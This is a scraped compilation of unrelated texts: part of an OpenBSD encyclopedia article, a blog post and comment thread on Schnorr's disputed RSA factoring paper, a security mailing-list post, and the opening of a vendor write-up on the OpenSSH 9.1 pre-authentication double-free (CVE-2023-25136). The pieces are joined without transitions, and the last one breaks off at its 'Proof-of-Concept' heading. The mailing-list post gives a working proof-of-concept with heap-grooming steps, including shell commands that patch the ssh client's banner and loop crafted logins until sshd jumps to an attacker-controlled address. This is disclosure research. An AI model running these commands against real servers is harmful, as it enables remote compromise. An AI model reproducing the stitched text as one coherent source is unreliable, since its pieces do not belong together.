In 2015, [Microsoft](/wiki/Microsoft "Microsoft") became the foundation's first gold level contributor[[121]](#cite_note-124) donating between $25,000-50,000 to support development of OpenSSH, which had been integrated into [PowerShell](/wiki/PowerShell "PowerShell") in July, and later into Windows Server in 2018.[[122]](#cite_note-125) Other contributors include Google, Facebook and [DuckDuckGo](/wiki/DuckDuckGo "DuckDuckGo").[[123]](#cite_note-126)

During the 2016 and 2017 fundraising campaigns, [Smartisan](/wiki/Smartisan "Smartisan"), a Chinese company, was the leading financial contributor to the OpenBSD Foundation.[[124]](#cite_note-127)[[125]](#cite_note-128)

## Distribution

[edit](/w/index.php?title=OpenBSD&action=edit&section=19 "Edit section: Distribution")

OpenBSD is freely available in various ways: the source can be retrieved by anonymous [CVS](/wiki/Concurrent_Versions_System "Concurrent Versions System"),[[126]](#cite_note-anoncvs-129) and binary releases and development snapshots can be downloaded by FTP, HTTP, and rsync.[[127]](#cite_note-ftp-130) Prepackaged CD-ROM sets through version 6.0 can be ordered online for a small fee, complete with an assortment of stickers and a copy of the release's theme song. These, with their artwork and other bonuses, have been one of the project's few sources of income, funding hardware, Internet service, and other expenses.[[128]](#cite_note-orders-131) Beginning with version 6.1, CD-ROM sets are no longer released.

OpenBSD provides a [package management system](/wiki/Package_manager "Package manager") for easy installation and management of programs which are not part of the base operating system.[[129]](#cite_note-faq15-132) Packages are binary files which are extracted, managed and removed using the package tools. On OpenBSD, the source of packages is the ports system, a collection of [Makefiles](/wiki/Makefile "Makefile") and other infrastructure required to create packages. In OpenBSD, the ports and base operating system are developed and released together for each version: this means that the ports or packages released with, for example, 4.6 are not suitable for use with 4.5 and vice versa.[[129]](#cite_note-faq15-132)

## Songs and artwork

[edit](/w/index.php?title=OpenBSD&action=edit&section=20 "Edit section: Songs and artwork")

[![](//upload.wikimedia.org/wikipedia/commons/c/c3/Puffyanim.gif)](/wiki/File%3APuffyanim.gif)3D-rendered, animated OpenBSD mascot *Puffy*[![](//upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Openbsd23cover.gif/292px-Openbsd23cover.gif)](/wiki/File%3AOpenbsd23cover.gif)OpenBSD 2.3 cover

Initially, OpenBSD used a haloed version of the [BSD daemon](/wiki/BSD_daemon "BSD daemon") mascot drawn by Erick Green, who was asked by De Raadt to create the logo for the 2.3 and 2.4 versions of OpenBSD. Green planned to create a full daemon, including head and body, but only the head was completed in time for OpenBSD 2.3. The body as well as pitchfork and tail was completed for OpenBSD 2.4.[[130]](#cite_note-mckusick_openbsd_shirt-133)

Subsequent releases used variations such as a police daemon by Ty Semaka,[[131]](#cite_note-openbsd_2.5_release-134) but eventually settled on a [pufferfish](/wiki/Pufferfish "Pufferfish") named Puffy.[[132]](#cite_note-2.7-release-135) Since then, Puffy has appeared on OpenBSD promotional material and featured in release songs and artwork.

The promotional material of early OpenBSD releases did not have a cohesive theme or design, but later the CD-ROMs, release songs, posters and tee-shirts for each release have been produced with a single style and theme, sometimes contributed to by Ty Semaka of the [Plaid Tongued Devils](/wiki/Plaid_Tongued_Devils "Plaid Tongued Devils").[[90]](#cite_note-lyrics-93) These have become a part of OpenBSD advocacy, with each release expounding a moral or political point important to the project, often through parody.[[133]](#cite_note-4.0-review-136)

Themes have included *Puff the Barbarian* in OpenBSD 3.3, which included an 80s [rock song](/wiki/Rock_music "Rock music") and parody of [Conan the Barbarian](/wiki/Conan_the_Barbarian "Conan the Barbarian") alluding to open documentation,[[90]](#cite_note-lyrics-93) [*The Wizard of OS*](/wiki/The_Wizard_of_OS_%28song%29 "The Wizard of OS (song)") in OpenBSD 3.7, related to the project's work on wireless drivers, and *Hackers of the Lost RAID*, a parody of [Indiana Jones](/wiki/Indiana_Jones "Indiana Jones") referencing the new RAID tools in OpenBSD 3.8.

## Releases

[edit](/w/index.php?title=OpenBSD&action=edit&section=21 "Edit section: Releases")

## No, RSA Is Not Broken

I have been seeing [this paper](https://eprint.iacr.org/2021/232) by cryptographer Peter Schnorr making the rounds: “Fast Factoring Integers by SVP Algorithms.” It describes a new factoring method, and its abstract ends with the provocative sentence: “This destroys the RSA cryptosystem.”

It does not. At best, it’s an improvement in factoring—and I’m not sure it’s even that. The paper is a preprint: it hasn’t been peer reviewed. Be careful taking its claims at face value.

Some discussion [here](https://crypto.stackexchange.com/questions/88582/does-schnorrs-2021-factoring-method-show-that-the-rsa-cryptosystem-is-not-secur).

I’ll append more analysis links to this post when I find them.

EDITED TO ADD (3/12): The latest version of the paper does not have the words “This destroys the RSA cryptosystem” in the abstract. [Some](https://www.reddit.com/r/crypto/comments/lwengh) [more](https://www.reddit.com/r/crypto/comments/lwevey) [discussion](https://www.reddit.com/r/crypto/comments/lx4bom).

Be careful. There are indicators that the author did not upload the preprint and the latest version does not contain the mentioned sentence. It has also been part in this blog: <https://blog.fefe.de/?ts=9ec00c82>

In <https://www.math.uni-frankfurt.de/~dmst/teaching/WS2019/SVP9.pdf> it says “This proves polynomial time bound.”. The paper may still be wrong.

@Anonymous

Obviously, if this factoring can be done in polynomial time it would be “bad” for RSA, but not necessarily terrible. I have personally seen the difference between n\*lg(n) and n^2, it is… substantial. If factoring can be done in, say n^3 time, it would be less secure than 2^n, but perhaps it could still be “safe enough.” It likely still wouldn’t break the paradigm that the fastest way is around the encryption rather than through it.

I could be wrong, and this might be the beginning of the end for RSA, I’ll leave that for experts like Bruce here to determine.

Just to save people a click, the most important point from the StackExchange discussion is that if Schnorr could “destroy RSA”, he would have destroyed one of the RSA Challenge problems to prove it. He did not.

@ Me,

> It likely still wouldn’t break the paradigm that the fastest way is around the encryption rather than through it.

With modern OS and Apps that’s almost true of old Julius’s little three up.

As an industry we realy realy need to work on basic security in our consumer systems, it’s truly appaling at the best of times.

It’s clear that just about all consumer and much commercial grad software out there is neither “fit for purpose”, nor is it “fit for merchantability”. As a rough rule of thumb the bigger the organization merchanting it, the worse the history right up to the currebt crop of vunerabilities.

But… I’m still going to try to read the Peter Schnorr preprint when it’s agreed which one is the most current. Why? Because sometimes I like a challenge especially when it appears unsolvable 😉

More seriously though, whilst the preprint may be cutting a trail in the wrong direction currently, it might give insight into other ways that will be more productive in the future.

I guess the real question for me at the end of the day is “Will I be able to enter the jungle?” the preprint appears to be…

Well, the version on the Goethe University of Frankfurt now (05 Mar 2021) is dated 04 Mar 2020 (hxxps://www.math.uni-frankfurt.de/~dmst/teaching/WS2019/SVP9.pdf), and thus is presumably later than the versions on the preprint server (hxxps://eprint.iacr.org/eprint-bin/versions.pl?entry=2021/232)

The the text “This destroys the RSA cryptosystem” has gone in the presumed most recent version.

I hope the Internet Archive or other mechanism has been keeping a record.

We have

Version dated as “work in progress 31.10.2019”

Version undated

uploaded to the preprint server 03 Mar 2021

with Keywords: Primal-dual reduction,SVP, fac-relation.

The abstract on the preprint server, and in the paper itself, contains the phrase “This destroys the RSA cryptosystem.”

Version dated “work in progress 04.03.2020” (Possibly a typo for 2021?)

available on the university website, downloaded by me today (05 Mar 2021)

with Keywords: Prime number lattice, Primal-dual reduction.

The in the paper itself, does not refer to destroying the RSA cryptosystem.

This last version still contains the phrase “Dabei iste= 2.7182818284···die Eulersche Zahl undπ= 3.141592654···die Kreiszahl.”

I have not done a diff on the papers, but they certainly appear to be changing.

My understanding so far (disclaimer: the math in Schnorr’s paper is far beyond me).

• Schnorr is the Real Deal: a distinguished mathematician who has made sufficient contribution to the field of cryptography, that I remember his name from my textbooks.

• The fastest *demonstrated* factoring algorithm for RSA moduli, called GNFS, looks for sets of numbers with a certain algebraic relationship to the modulus. [This is the sieving phase.] Each such set is a sort of “clue” to the factorization. When very many distinct sets have been found, they can be composed into a matrix (of truly gigantic dimensions) and the factorization found by solving the matrix. [This is the linear algebra phase.]

• If I’m following the concept, Schnorr proposes a system along roughly the same lines, which begins with sieving for distinct sets of numbers with a simple relationship to the integer to be factored. This could “break” RSA, if sieving can be done much more quickly than in GNFS, and/or the linear algebra matrix is much smaller.

• Schnorr (if I understand correctly) proposes that algorithms related to mathematical groups called lattices can greatly improve the speed of the search, by leading with high probability to sets with the desired property. I suppose a crude analogy would be sifting sand for grains of iron with a magnet, rather than by visual sorting.

• The link provided by Bruce above — to a short but pithy discussion thread — is the best source I’ve yet seen for comments coming from people who apparently have understanding of the subject matter. My reading of the critiques is that Schnorr seems to have made important mistakes, and that the theorems he has proved don’t go far enough to justify his conclusions.

• Even worse, the critiques suggest that viewed accurately, Schnorr’s approach is perhaps not an improvement on GNFS, and might actually be slower.

• If anyone factored a big semiprime using Schnorr’s strategy — even if the number were much smaller than the current RSA factoring record — then some meaningful assessment could be begin as to whether this approach has any implications for the security of cryptosystems, or even whether it’s really faster than GNFS. If such a factorization had been done already, we would surely have heard of it!

• However, the *lack* of a demonstration doesn’t prove that the factoring technique is deficient. The software package used for most recent factoring records, CADO-NFS, has about 450,000 source lines (that’s 30% of emacs !!!!). A lot of that is complexity to optimize time-consuming processes; I don’t know how small a “demonstration” package could be. If the complexity needed to realize Schnorr’s factoring approach is comparable (and for all I know, it could be even worse), then he obviously can’t shake the software package out of his sleeve.

• What apparently *has* been done, is some software meant to demonstrate the heart of Schnorr’s sieving technique.

• Schnorr has been making presentations on his concept since at least 2009. In my personal opinion, 11+ years is enough time for a small group to make some kind of significant demonstration software, *if people believed that the idea is likely to work*.

• Because this proposed factoring technique has been public for more than a decade, both specialists in lattice algorithms, and other mathematicians who focus on factoring algorithms in general, have had plenty of opportunity to study Schnorr’s ideas. I don’t see evidence that even one mathematician with relevant expertise has yet been persuaded.

@ MarkH,

> if people believed that the idea is likely to work

It’s actually a variation on “Not Invented Here” syndrom and mathmatics has more than a few examples.

A couple straight of the top of my head,

1, Proof of Fermat’s Last Theorem, which (Wiles’s finally did).

2, Proof of “PRIMES in P” now called AKS Primality test (published by Manindra Agrawal, Neeraj Kayal and Nitin Saxena)

In both cases mathmaticians had assumed it was not possible to solve either so did not bother looking.

But one thing we do know is that there is more than one rule of the form,

“If the base ten digits add up to nine mod ten then the number is divisable by nine”

The practical question is how do we find them all and the correct base to apply efficiently. Obviously a “lookup table” is going to be a little large.

Schnorr has been tinkering with this since his retirement in 2011, you can trace back a series of papers to at least 2012. One of the very early versions had a student implement and run it on a toy problem and it worked, but only in the sense of “it works as intended” rather than “it can be used on RSA-sized numbers”.

The whole result is so unlikely that the initial reaction was that it was a hoax by someone else misusing a paper from Schnorr, until Schnorr confirmed it was legit, at which point people started looking for the error(s) in it.

So I think it’s a case of: Retired mathematician plays with X as a hobby for a decade and then makes a slip-up but is so excited by the result he gets that he rushes it out without first getting it checked.

@Clive:

I have a different perspective on the attitudes of academic mathematicians toward (a) a mathematician’s choice of problem to work on, and (b) publication of unexpected results.

My understanding is that prior to the publication of “Primes is in P,” many workers in the specialized field of complexity theory had formed the opinion that no deterministic polynomial-time algorithm could be found for primality testing.

That being so, colleagues might have looked skeptically at Agrawal for working on the problem of finding such an algorithm (he was already in his 30s). His two young collaborators, however, were on the point of getting their first university degrees, so they weren’t taking any real risk to their reputations.

The situation with the Fermat conjecture (Fermat’s “Last Theorem” or FLT) was quite different. It suffered from a two-part stigma: (a) it was fiendishly hard, having resisted centuries of attempts to crack it; and (b) it was trivial, in the sense that no important mathematical question depended on whether FLT was valid.

For a mathematician to beat his head against this wall, when success could bring newspaper coverage not mathematical fruits, was considered Bad Form. Wiles kept his desire to prove FLT secret, and didn’t do any serious work on it until …

Work by academic mathematicians Gerhard Frey and Ken Ribet showed that if a certain Very Important Conjecture could be proved, then FLT must be true: proof of Fermat would be a corollary.

That Very Important Conjecture was then known as the Taniyama-Shimura (or sometimes Taniyama-Weil) conjecture; now that it’s proven, it’s called the Modularity Theorem.

When Wiles was working on the problem, dozens (if not hundreds) of papers had been published in journals with statements similar in form to “if Taniyama-Shimura is true, then we can prove the following result …”

In other words, proof of that conjecture was going to be extremely consequential.

For Wiles, the Frey/Ribet breakthrough made all the difference: it transformed the difficulty of FLT from “fiendish” to “nobody has an idea of how to do that” [1] and its significance from “trivial” to “one the most important unsolved problems in mathematics.”

Nobody professional in math or computer science has been ridiculed — as far as I’m aware — for serious work on factoring algorithms. The problem is both famous, and of obvious practical importance. Making progress on factoring might not raise your standing as a mathematician, but it gives you star status in the field of cryptography.

Nobody has proved any meaningful lower bounds on the cost of factoring. GNFS is the best yet discovered for RSA moduli — and no better alternative has been found for about 25 years.

However, there is simply no theoretical basis for supposing that GNFS is the best possible. Complexity theorists would be excited to see a big improvement in factoring, but such a breakthrough wouldn’t damage anybody’s theory or reputation.

There’s just no *a priori* reason for mathematicians to suppose that quicker factoring can’t be done. If you can do it … just show them the receipts! I predict that if your work is serious, they will take it seriously.

================

So I shift from choice of problem, to reception of the work.

A. In the case of “PRIMES is in P,” many mathematicians were able to follow the arguments and proofs of their paper. It had the added advantage that it wasn’t difficult to code a program running their algorithm.

Although their result was a big surprise, it was (if I recall those days correctly) accepted as valid within a matter of weeks.

B. Wiles worked on Taniyama-Shimura in total secrecy (until the very end, when he felt the need for some checking by a very select few). It was a very respectable problem, because it was so important; his obsessive secrecy was a function of his personal psychology, rather than reputational risk.

His first paper (containing a defect that would take him months to solve) was on the order of 100 pages in length, and its mathematics so specialized that if everyone on Earth who could understand it without lengthy study had gathered together, they could have ridden together in an elevator car.

Although Wiles’ announcement of a proof was a shock to his profession, his work was taken very seriously, and the necessary experts promptly went to work analyzing his paper statement by statement. I’m not aware of any mathematicians rejecting his claims out-of-hand.

C. A rather sad example is the claimed proof by Louis de Branges of Riemann’s zeta function conjecture (known far and wide as the Riemann Hypothesis or RH).

A poll of mathematicians would probably rank RH as the single most important unsolved problem in their discipline, so working on it is a respectable choice; but it has resisted proof (or disproof) for more than 150 years, so unless one is manifestily working on an approach that is both plausible, and not tried before, it’s very likely a waste of time.

de Branges’ paper is similar in length to Wiles’, and perhaps even more difficult to analyze. The people most qualified to evaluate it might need to devote many months of their working life to its examination.

Before making such an investment, they would probably need to see the “germ of an idea” — what new concept or approach the author has brought to bear, which can plausibly succeed where all others before have failed.

de Branges has not convinced his colleagues that this “germ of an idea” is present, so his paper remains in a sort of limbo, neither accepted nor shown to be false. I can assure you, that many mathematicians despair that they will live to see a proof of RH, and would be delighted to learn of one.

================

By comparison, Schnorr’s paper is neither very long, nor (as far as I understand) does it contain math known only to a handful. Lattice algorithms seem to be fairly well-studied, so there might be dozens of professional mathematicians (and perhaps a similar number of grad students) able to follow the arguments in detail.

As of today, they don’t seem to be buying what Schnorr is selling. The window is still open for him to make his case, but he’s got to show his profession more than he has so far.

[1] The distinction is that although nobody expected a proof of Taniyama-Shimura, it had not resisted so many long and determined attacks as FLT had.

@MarkH @Clive

re:  *The value of trying*

Thank you MarkH for the wonderful synopsis.

I remember documentaries about FLT and how it was “solved” and the ultimate analysis was it was solved, but not the way Fermat would have solved it.

There can be many roads to discovery and not all of them successful. Even a failed attempt has value. And some failed attempts turn out not to be failures after all.

Does/did anybody, the paper author, Bruce, or anybody else, even sketch up how in any case the security of the cryptosystem would even be compromised?

Seems like, at least the notion, would be interesting to explore. Me not being noothing like an expert on cryptography or security, perhaps there was some easily overlooked detailed to some implementation that might cause a so called catastrophic failure in the security of a cryptosystem?

If anything, I think I’ve learned after all these years reading this blog, is that the correct implementation of a security system is important to both understand and maintain so that there aren’t any flaws happening, or existing with the past, present or future implementaiton of something.

I’ve found no “new news” on Schnorr factoring, which is hardly surprising.

I finally got around to looking at the github page by Léo Ducas for his “SchnorrGate” project:

<https://github.com/lducas/SchnorrGate>

Ducas is an academic mathematician working in the Netherlands. Lattices are his specialty, and he happens to be currently giving a course on lattices and cryptography.

What I learned:

• Not only has Schnorr been making polynomial-time claims for his factoring strategy since 2009 … he described this strategy in 1991, building on a 1975 (!) factoring paper by Brillhart and Morrison.

In other words, this idea ain’t new, and mathematicians have looked at it quite seriously.

• None of Schnorr’s papers claiming polynomial-time factoring has yet passed peer review.

• The essence of Schnorr’s idea (if I understand it) is that solving a specific lattice problem (SVP) provides an *efficient* way to search for the arithmetic relations which must be accumulated in order to factor the given integer.

Ducas was able (using a specialized software package) to quickly code Schnorr’s relation search algorithm, and test it experimentally. His experiments showed that the search for relations is much less fruitful than Schnorr calculates.

• On the basis of those experiments, Ducas concludes that in order to successfully factor, the size of the lattice problem would have to be scaled up by a really large factor to yield a sufficient quantity of relations.

With sufficiently big lattices for this to succeed, the strategy would almost certainly be slower than GNFS.

================

As an algorithmic aside not relevant to factoring — or even cryptography! — I just learned about work from 2 years ago by Harvey and van der Hoeven proposing a novel multiplication algorithm.

Math-geek readers will be aware that the fastest practical method for multiplying Really Huge Numbers uses the Fast Fourier Transform (FFT). As far as I’m aware, numbers that big are never used in crypto, but this FFT-based multiplication is at the heart of (for example) the Great Internet Mersennse Prime Search (GIMPS).

Engineers are used to thinking of Fourier Transforms in one dimension, though 2D or even 3D FFT is sometimes useful. The multiplication technique used in number theory projects like GIMPS uses one-dimensional FFT.

A conjectured lower bound for the cost of multiplication is O(N log(N)), which is attained in the Harvey and van der Hoeven … but their multiplication requires computing FFT in 1,729 dimensions!

This algorithm is only fastest for numbers too large to be even *represented* in the physical universe … so it’s probably not showing up in a software library any time soon.

@Curious

At a high level, the security of the RSA algorithm depends on the idea that factoring large numbers is a hard problem but computing those numbers from their factors is easy.

To use RSA, you select a pair of large prime numbers and compute a public key from them which anyone can use to encrypt a message to you. You also compute a second key from those primes which you can use to decrypt those messages.

As long as it’s very hard for someone else to reverse engineer your secret primes from your public key, then RSA is secure. However if that can be done efficiently, then any attacker is able to use your public key to work out your private key and read messages sent to you.

@Tea:

I’m familiar with the taxicab number story about Hardy and Ramanujan, but I’m not confident that I would have recalled the number.

In the event, I didn’t recognize it in the multiplication algorithm story, so thanks for pointing that out!

Skimming the paper, I saw that the authors did a lower-bound calculation for the required FFT dimension, and determined that any number greater than 1728 would suffice, so they chose 1729.

The paper ends with a brief discussion of how the application of a number of optimizations could adapt their multiplication to 9D FFTs, though at the cost of complicating the algorithm rather considerably.

I don’t see in their paper a calculation of the lower bound of integer sizes for their technique to run faster than the Schoenhage-Strassen algorithm using 1D FFT, so I don’t know what impact (if any) the proposed optimizations would have on that bound.

Subject: Re: double-free vulnerability in OpenSSH server 9.1 (CVE-2023-25136)

Hi all,

Quick update: we were able to gain arbitrary control of the "rip"
register through this bug (i.e., we can jump wherever we want in sshd's
address space) on an unpatched installation of OpenBSD 7.2 (which runs
OpenSSH 9.1 by default). This is by no means the end of the story: this
was only step 1, bypass the malloc and double-free protections. The next
steps, which may or may not be feasible at all, are:

- step 2, execute arbitrary code despite the ASLR, NX, and ROP
  protections (this will probably require an information leak, either
  through the same bug or through a secondary bug);

- step 3, escape from sshd's sandbox (through a secondary bug, either in
  the privileged parent process or in the kernel's reduced attack
  surface).

Quick recap of this double-free bug: if an old ssh client connects to an
sshd 9.1, then options.kex_algorithms (which is a string of 266 bytes in
the default configuration) is mistakenly free()d at the beginning of the
key-exchange phase (in compat_kex_proposal()); options.kex_algorithms is
then later free()d again at the beginning of the authentication phase
(in mm_getpwnamallow()).

The trick to bypass malloc's double-free and use-after-free protections
is to re-allocate the memory that was occupied by options.kex_algorithms
as soon as it is free: from malloc's point of view, no attempt is made
to free, read, or write memory that is already free; from sshd's point
of view, however, an aliasing attack occurs: two different pointers to
two different objects refer to the same chunk of memory, and a write to
one object overwrites the other object. This opens up a world of
possibilities.

We started our investigation on Debian bookworm (which uses glibc's
malloc), but we eventually switched to OpenBSD 7.2, because OpenBSD's
malloc (despite its very defensive programming) has two features that
make it especially interesting for this particular double-free bug:

- Free chunks of memory are sorted (according to their size) into
  buckets that are spaced at power-of-two intervals; i.e., any object
  whose size is between 256 and 512 bytes can re-allocate the memory
  that was occupied by options.kex_algorithms. This gives us
  considerable freedom.

  (On the other hand, glibc's malloc sorts free chunks of memory into
  buckets that are spaced at 16-byte intervals; i.e., only an object
  whose size is almost exactly 266 bytes can re-allocate the memory that
  was occupied by options.kex_algorithms. This leaves us with little
  freedom of choice.)

- OpenBSD's malloc() function picks a free chunk at random from several
  (4) pages of memory; i.e., most of the time it will not pick the chunk
  where options.kex_algorithms was allocated, but at least sometimes it
  will (with a probability of ~1/(4*4096/512)=1/32).

  (On the other hand, glibc's malloc() function behaves like a strict
  LIFO (last in, first out); i.e., it will never pick the chunk where
  options.kex_algorithms was allocated unless we precisely control the
  sequence of malloc() and free() calls in sshd, which is something we
  have been unable to do so far.)

Our current proof-of-concept works as follows:

- First, we free options.kex_algorithms in compat_kex_proposal(), by
  pretending that our ssh client is an old "FuTTY" client.

- Second, we re-allocate the chunk that was occupied by
  options.kex_algorithms, with a struct EVP_AES_KEY whose size is 264
  bytes, by selecting the "aes128-ctr" cipher during the key-exchange
  phase. This re-allocation happens with a probability of ~1/32.

- Third, we free (again) the chunk that was occupied by
  options.kex_algorithms (and is occupied by the struct EVP_AES_KEY now)
  in kex_assemble_names() (via mm_getpwnamallow()). This free happens if
  and only if the first byte of the chunk is '+', '-', or '^' (otherwise
  kex_assemble_names() returns an error and fatal_fr() is called), but
  luckily for us the first byte of the struct EVP_AES_KEY is the first
  byte of the AES key itself, which is a random byte; so this free
  happens with a probability of ~3/256.

- Fourth, we re-allocate the chunk that was occupied by
  options.kex_algorithms (and is still referenced as a struct
  EVP_AES_KEY now), with a string of 300 'A' bytes, through either
  "authctxt->user" or "authctxt->style" during the authentication phase.
  This re-allocation, which effectively overwrites the entire struct
  EVP_AES_KEY with 'A' bytes, happens with a probability of ~2/32.

- Last, we jump to 0x4141414141414141 when sshd calls EVP_Cipher(),
  because the struct EVP_AES_KEY contains a function pointer that was
  overwritten by our 'A' bytes and that is called by
  CRYPTO_ctr128_encrypt_ctr32() (via EVP_Cipher()).

This proof-of-concept can be simply reproduced with the ssh client from
OpenBSD 7.2; we change its banner from "OpenSSH" to "FuTTY", and run it
in a loop with the "aes128-ctr" cipher:

------------------------------------------------------------------------
$ cp -i /usr/bin/ssh ./ssh

$ sed -i s/OpenSSH_9.1/FuTTYSH_9.1/g ./ssh

$ user=`perl -e 'print "A" x 300'` && while true ;do ./ssh -o NumberOfPasswordPrompts=0 -o Ciphers=aes128-ctr -l "$user:$user" 192.168.56.123 ;done
------------------------------------------------------------------------

sshd has a good chance of jumping to 0x4141414141414141 after
32*256/3*16=43690 runs (this number is probably not entirely correct,
but not entirely wrong either):

------------------------------------------------------------------------
# gdb /usr/sbin/sshd 53370

------------------------------------------------------------------------

(Note: this is a very crude proof-of-concept, which can certainly be
improved in many different ways.)

In conclusion, this double-free bug in sshd is an excellent opportunity
to test how strong the modern memory protections really are. We are at
your disposal for questions, comments, and further discussions. Thank
you very much!

![OpenSSH Pre-Auth Double Free CVE-2023-25136 Writeup and PoC](data:image/svg+xml...)![OpenSSH Pre-Auth Double Free CVE-2023-25136 Writeup and PoC](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2023/02/08165525/CVE-2023-25136-Writeup-and-PoC-863x300_1.png)

OpenSSH’s newly released version [9.2p1](https://www.openssh.com/txt/release-9.2) contains a fix for a [double-free](https://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory) vulnerability.

Given the severe potential impact of the vulnerability on OpenSSH servers (DoS/RCE) and its high popularity in the industry, this security fix prompted the JFrog Security Research team to investigate the vulnerability.

This blog post provides details on the vulnerability, who is affected, and a proof-of-concept to trigger it causing a Denial of Service (DoS).

**February 14, 2023 Update:**

**Since the publication of this blog post, [Qualys Security has managed](https://seclists.org/oss-sec/2023/q1/92) to leverage this double-free for a limited remote code execution exploit in OpenBSD, when no security mitigations are applied. Therefore, we updated this blog post and our impact analysis to “High”. See “Vulnerability Impact” below.**

## What is OpenSSH?

[OpenSSH](https://www.openssh.com) is a popular tool used for secure communication and remote access. It was developed as a free, open-source implementation of the Secure Shell (SSH) communications protocol and is widely used for various applications.

OpenSSH provides a secure and encrypted connection between two untrusted hosts over an insecure network, making it an essential tool for remote access and secure file transfer.

With the increasing use of cloud computing and remote access to servers, OpenSSH has become a crucial tool for system administrators and developers who need to access and manage remote systems securely.

OpenSSH also supports a wide range of platforms including Linux, macOS, and Windows, making it a widely adopted tool across different operating systems. With its ease of use and strong security features, OpenSSH has become an industry-standard tool for secure remote access.

## Vulnerability Background

On February 2, 2023, OpenSSH released version 9.2p1 with this [security advisory](https://www.openssh.com/txt/release-9.2). It immediately became clear this version is of interest because of the pre-auth double-free vulnerability. Searching the OpenSSH’s GitHub repository, this is the [fix commit](https://github.com/openssh/openssh-portable/commit/12da7823336434a403f25c7cc0c2c6aed0737a35).

The commit message indicates `bz3522`, which refers to the `Bugzilla` [issue](https://bugzilla.mindrot.org/show_bug.cgi?id=3522) reported by the user Mantas Mikulėnas.

In its report, Mantas mentions using PuTTY obsolete version 0.64, also attaching a back-trace of the double-free abort.

## Research Walkthrough

To dive deeper, we set up an environment with the vulnerable OpenSSH 9.1p1 and pulled a copy of the old PuTTY 0.64 version, released 8 years ago on February 28, 2015.

The following error was returned after trying to connect with PuTTY 0.64 to the vulnerable OpenSSH server:

![PuTTY 0.64 Fatal Error](data:image/svg+xml...)![PuTTY 0.64 Fatal Error](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2023/02/08171707/1_PuTTY-0.64-Fatal-Error.png)

Since the obsolete client’s key exchange algorithms are not supported by the new OpenSSH version, we edited the sshd\_config file by adding the following line to the `/etc/ssh/sshd_config`:

`KexAlgorithms +diffie-hellman-group1-sha1`

After restarting the SSH server and trying again, the following error was returned:

![PuTTY Fatal Error](data:image/svg+xml...)![PuTTY Fatal Error](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2023/02/08171733/2_PuTTY-Fatal-Error.png)

After adding another configuration line to the sshd\_config, we were able to connect to the vulnerable OpenSSH server and reproduce the crash:

`HostKeyAlgorithms +ssh-rsa`

Running the server in debug mode (using the `-ddd` flag), the following debug message was returned:

`ssh_sandbox_violation: unexpected system call (arch:0xc000003e,syscall:20 @ 0x7fd7473fb771) [preauth]`

The Syscall number 20 is `writev()` which matches the `Bugzilla` report.

Note that the configuration changes we’ve made were only to reproduce the vulnerability through PuTTY and are not required to exploit it. As we’ll see in the PoC, the default configuration is vulnerable.

## Vulnerability In-Depth Details

We started by examining the fix commit stating that `compat_kex_proposal()` is responsible for the double-free. When the connection compatibility option `SSH_OLD_DHGEX` is true on [1], the second argument `p` is assigned to `cp` on [2] and later freed on [3].

```
/* Always returns pointer to allocated memory, caller must free. */
char *
compat_kex_proposal(struct ssh *ssh, char *p)
{
    char *cp = NULL;

    if ((ssh->compat & (SSH_BUG_CURVE25519PAD|SSH_OLD_DHGEX)) == 0)
        return xstrdup(p);
    debug2_f("original KEX proposal: %s", p);
    if ((ssh->compat & SSH_BUG_CURVE25519PAD) != 0)
        if ((p = match_filter_denylist(p,
            "curve25519-sha256@libssh.org")) == NULL)
            fatal("match_filter_denylist failed");
    if ((ssh->compat & SSH_OLD_DHGEX) != 0) {               [1]
        cp = p;                                             [2]
        if ((p = match_filter_denylist(p,
            "diffie-hellman-group-exchange-sha256,"
            "diffie-hellman-group-exchange-sha1")) == NULL)
            fatal("match_filter_denylist failed");
        free(cp);                                           [3]
    }
    debug2_f("compat KEX proposal: %s", p);
    if (*p == '\0')
        fatal("No supported key exchange algorithms found");
    return p;
}
```

The call to `compat_kex_proposal()` is inside the `do_ssh2_kex()` function:

```
    myproposal[PROPOSAL_KEX_ALGS] = prop_kex = compat_kex_proposal(ssh,
        options.kex_algorithms);
```

The freed `cp=p` from `compat_kex_proposal()` refers to the `options.kex_algorithms` argument.

Searching for `kex_algorithms` in the source code, we encountered the `assemble_algorithms` from the crash in the Bugzilla report:

```
ASSEMBLE(kex_algorithms, def_kex, all_kex);
```

`ASSEMBLE` is a macro for calling the `kex_assemble_names()` function:

```
#define ASSEMBLE(what, defaults, all) \
    do { \
        if ((r = kex_assemble_names(&o->what, defaults, all)) != 0) \
            fatal_fr(r, "%s", #what); \
    } while (0)
```

The `kex_assemble_names()` function is called with the address of `o->kex_algorithms` as its first argument (which is `listp`). This is where the second free occurs.

```
int
kex_assemble_names(char **listp, const char *def, const char *all)
```

Due to the `options.kex_algorithms` handle being freed and becoming a dangling pointer, it’s once again freed causing a double-free.

But where is the `SSH_OLD_DHGEX` option set?

Inside the `compat_banner()` function, which determines bug flags from the SSH protocol banner. A struct named `check[]` lists all the SSH client IDs and their flags. The following snippet shows the Client IDs that are assigned the `SSH_OLD_DHGEX` option. We can also see that WinSCP might also be able to trigger this behavior.

```
        { "PuTTY_Local:*,"  /* dev versions < Sep 2014 */ "PuTTY-Release-0.5*," /* 0.50-0.57, DH-GEX in >=0.52 */
          "PuTTY_Release_0.5*," /* 0.58-0.59 */
          "PuTTY_Release_0.60*,"
          "PuTTY_Release_0.61*,"
          "PuTTY_Release_0.62*,"
          "PuTTY_Release_0.63*,"
          "PuTTY_Release_0.64*",
                    SSH_OLD_DHGEX },
        { "FuTTY*",     SSH_OLD_DHGEX }, /* Putty Fork */
        { "WinSCP_release_4*,"
          "WinSCP_release_5.0*,"
          "WinSCP_release_5.1,"
          "WinSCP_release_5.1.*,"
          "WinSCP_release_5.5,"
          "WinSCP_release_5.5.*,"
          "WinSCP_release_5.6,"
          "WinSCP_release_5.6.*,"
          "WinSCP_release_5.7,"
          "WinSCP_release_5.7.1,"
          "WinSCP_release_5.7.2,"
          "WinSCP_release_5.7.3,"
          "WinSCP_release_5.7.4",
                    SSH_OLD_DHGEX },
```
## Proof-of-Concept

